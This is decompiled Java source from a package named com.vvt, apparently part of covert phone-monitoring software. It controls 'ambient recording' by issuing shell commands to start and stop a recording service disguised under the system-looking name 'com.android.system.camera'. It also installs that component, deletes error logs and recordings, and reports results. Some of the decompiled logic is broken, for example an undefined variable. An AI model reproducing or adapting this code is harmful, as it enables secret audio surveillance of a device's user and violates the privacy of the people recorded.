package com.vvt.a;

import android.content.Context;
import android.os.SystemClock;
import com.vvt.ab.e;
import com.vvt.events.FxEventDirection;
import com.vvt.events.FxSystemEvent;
import com.vvt.events.FxSystemEventCategories;
import com.vvt.io.d;
import com.vvt.io.p;
import com.vvt.shell.ShellUtil;
import com.vvt.shell.f;
import java.io.File;
import java.util.ArrayList;
import java.util.List;
import java.util.Timer;
import java.util.TimerTask;

public class i
  implements a
{
  private static final boolean a = com.vvt.ak.a.a;
  private static final boolean b = com.vvt.ak.a.e;
  private Context c;
  private boolean d;
  private com.vvt.base.a e;
  private String f;
  private c g;
  private String h;
  private int i;
  private Timer j;
  
  public i(com.vvt.base.a parama, Context paramContext)
  {
    this.e = parama;
    this.c = paramContext;
  }
  
  private void a(String paramString)
  {
    Object localObject1 = new com/vvt/events/FxSystemEvent;
    ((FxSystemEvent)localObject1).<init>();
    Object localObject2 = FxEventDirection.OUT;
    ((FxSystemEvent)localObject1).setDirection((FxEventDirection)localObject2);
    long l = System.currentTimeMillis();
    ((FxSystemEvent)localObject1).setEventTime(l);
    ((FxSystemEvent)localObject1).setMessage(paramString);
    localObject2 = FxSystemEventCategories.CATEGORY_DEBUG_MESSAGE;
    ((FxSystemEvent)localObject1).setLogType((FxSystemEventCategories)localObject2);
    boolean bool = a;
    if (bool) {}
    localObject2 = new java/util/ArrayList;
    ((ArrayList)localObject2).<init>();
    ((ArrayList)localObject2).add(localObject1);
    localObject1 = this.e;
    if (localObject1 != null)
    {
      localObject1 = this.e;
      ((com.vvt.base.a)localObject1).a((List)localObject2);
    }
  }
  
  public void a(boolean paramBoolean)
  {
    int k = 1;
    boolean bool1 = a;
    if (bool1) {}
    Object localObject1 = new Object[k];
    Object localObject2 = "com.android.system.action.r.stop";
    localObject1[0] = localObject2;
    Object localObject3 = String.format("am startservice -a %s", (Object[])localObject1);
    localObject1 = f.a();
    for (;;)
    {
      boolean bool3;
      try
      {
        ((f)localObject1).a((String)localObject3);
        bool1 = a;
        if (bool1) {}
        ((f)localObject1).d();
        this.d = false;
        bool1 = a;
        if (bool1) {}
        long l1 = 3000L;
        SystemClock.sleep(l1);
        localObject3 = com.vvt.m.a.d;
        localObject1 = this.f;
        localObject3 = p.a((String)localObject3, (String)localObject1);
        localObject1 = new java/io/File;
        ((File)localObject1).<init>((String)localObject3);
        localObject2 = p.a(com.vvt.m.a.d, "err.log");
        Object localObject5 = new java/io/File;
        ((File)localObject5).<init>((String)localObject2);
        boolean bool2 = ((File)localObject5).exists();
        if (!bool2) {
          break label333;
        }
        bool2 = a;
        if (bool2) {}
        this.d = false;
        localObject5 = d.d((String)localObject2);
        Object localObject6 = new java/lang/StringBuilder;
        ((StringBuilder)localObject6).<init>();
        String str2 = "Error starting. Err:";
        localObject5 = str2 + (String)localObject5;
        localObject6 = this.g;
        if ((localObject6 != null) && (paramBoolean))
        {
          localObject6 = this.g;
          ((c)localObject6).a((String)localObject5);
          a((String)localObject5);
          ShellUtil.i((String)localObject2);
          bool3 = ((File)localObject1).exists();
          if (bool3) {
            ShellUtil.i((String)localObject3);
          }
          bool1 = a;
          if (bool1) {}
          localObject3 = this.j;
          if (localObject3 != null)
          {
            localObject3 = this.j;
            ((Timer)localObject3).cancel();
          }
          this.j = null;
          this.g = null;
          bool1 = a;
          if (bool1) {}
          return;
        }
      }
      finally
      {
        ((f)localObject1).d();
      }
      boolean bool4 = b;
      if (bool4)
      {
        continue;
        label333:
        boolean bool5 = ((File)localObject1).exists();
        if (bool5)
        {
          long l2 = ((File)localObject1).length();
          long l3 = 0L;
          bool5 = l2 < l3;
          if (bool5)
          {
            bool3 = a;
            if (bool3) {}
            localObject1 = this.h;
            ShellUtil.a(str1, (String)localObject1);
            ShellUtil.i(str1);
            localObject4 = this.g;
            if ((localObject4 != null) && (paramBoolean))
            {
              localObject4 = this.g;
              localObject1 = this.h;
              ((c)localObject4).b((String)localObject1);
              continue;
            }
            bool1 = b;
            if (!bool1) {
              continue;
            }
            continue;
          }
        }
        bool3 = ((File)localObject1).exists();
        if (bool3) {
          ShellUtil.i((String)localObject4);
        }
        localObject1 = "Recorded file %s does not exists.";
        localObject2 = new Object[k];
        localObject2[0] = localObject4;
        Object localObject4 = String.format((String)localObject1, (Object[])localObject2);
        bool3 = b;
        if (bool3) {}
        localObject1 = this.g;
        if ((localObject1 != null) && (paramBoolean))
        {
          localObject1 = this.g;
          ((c)localObject1).a((String)localObject4);
        }
        else
        {
          bool1 = b;
          if (!bool1) {}
        }
      }
    }
  }
  
  public boolean a()
  {
    return this.d;
  }
  
  public boolean a(String paramString1, String paramString2, int paramInt, c paramc)
  {
    boolean bool1 = false;
    Object localObject1 = null;
    for (;;)
    {
      boolean bool2;
      try
      {
        boolean bool3 = a;
        if (bool3) {}
        bool3 = a;
        if (bool3) {}
        bool3 = this.d;
        if ((bool3) && (paramc != null))
        {
          localObject4 = "Cannot start the recording because an ambient recording is in progress.";
          paramc.a((String)localObject4);
          return bool1;
        }
        bool1 = a;
        if (bool1) {}
        localObject1 = this.c;
        localObject4 = "com.android.system.camera";
        bool1 = e.a((Context)localObject1, (String)localObject4);
        bool3 = a;
        if ((!bool3) || (!bool1))
        {
          bool1 = a;
          if (bool1) {}
          localObject1 = com.vvt.m.a.c;
          ShellUtil.g((String)localObject1);
          bool1 = a;
          if (bool1) {}
          localObject1 = this.c;
          localObject4 = "com.android.system.camera";
          n = 90000;
          e.a((Context)localObject1, (String)localObject4, n);
        }
        localObject1 = "/";
        try
        {
          int k = paramString2.lastIndexOf((String)localObject1) + 1;
          localObject1 = paramString2.substring(k);
          this.f = ((String)localObject1);
          localObject1 = "am startservice -a %s --es fileName %s --ei source %s --ei originator %s";
          int m = 4;
          localObject4 = new Object[m];
          n = 0;
          localStringBuilder = null;
          localObject5 = "com.android.system.action.r.start";
          localObject4[0] = localObject5;
          n = 1;
          localObject5 = this.f;
          localObject4[n] = localObject5;
          n = 2;
          int i1 = 1;
          localObject5 = Integer.valueOf(i1);
          localObject4[n] = localObject5;
          n = 3;
          i1 = 2;
          localObject5 = Integer.valueOf(i1);
          localObject4[n] = localObject5;
          localObject1 = String.format((String)localObject1, (Object[])localObject4);
          localObject4 = f.a();
        }
        catch (Exception localException)
        {
          StringBuilder localStringBuilder;
          Object localObject5;
          long l1;
          boolean bool4 = false;
          localObject4 = null;
          this.d = false;
          bool4 = b;
          if ((bool4) && (paramc == null)) {
            continue;
          }
          String str = localException.toString();
          paramc.a(str);
          continue;
        }
        try
        {
          ((f)localObject4).a((String)localObject1);
          bool2 = a;
          if (bool2) {}
          ((f)localObject4).d();
          bool2 = a;
          if (bool2) {}
          l1 = 5000L;
          SystemClock.sleep(l1);
          bool2 = a;
          if (bool2) {}
          localObject1 = "com.android.system.camera";
          ShellUtil.j((String)localObject1);
          localObject1 = com.vvt.m.a.d;
          localObject4 = "err.log";
          localObject1 = p.a((String)localObject1, (String)localObject4);
          localObject4 = new java/io/File;
          ((File)localObject4).<init>((String)localObject1);
          bool4 = ((File)localObject4).exists();
          if (bool4)
          {
            bool4 = a;
            if (bool4) {}
            bool4 = false;
            localObject4 = null;
            this.d = false;
            localObject4 = d.d((String)localObject1);
            localStringBuilder = new java/lang/StringBuilder;
            localStringBuilder.<init>();
            localObject5 = "Error starting. Err:";
            localStringBuilder = localStringBuilder.append((String)localObject5);
            localObject4 = localStringBuilder.append((String)localObject4);
            localObject4 = ((StringBuilder)localObject4).toString();
            if (paramc != null) {
              paramc.a((String)localObject4);
            }
            a((String)localObject4);
            ShellUtil.i((String)localObject1);
            localObject1 = com.vvt.m.a.d;
            localObject4 = this.f;
            localObject1 = p.a((String)localObject1, (String)localObject4);
            localObject4 = new java/io/File;
            ((File)localObject4).<init>((String)localObject1);
            bool4 = ((File)localObject4).exists();
            if (bool4) {
              ShellUtil.i((String)localObject1);
            }
            bool2 = a;
            if (bool2) {}
            bool2 = this.d;
            continue;
          }
        }
        finally
        {
          ((f)localObject4).d();
        }
        bool2 = true;
      }
      finally {}
      this.d = bool2;
      this.g = paramc;
      this.h = paramString2;
      this.i = paramInt;
      Timer localTimer = new java/util/Timer;
      localTimer.<init>();
      this.j = localTimer;
      localTimer = this.j;
      Object localObject4 = new com/vvt/a/j;
      ((j)localObject4).<init>(this);
      int n = this.i;
      long l2 = n;
      localTimer.schedule((TimerTask)localObject4, l2);
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/a/i.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */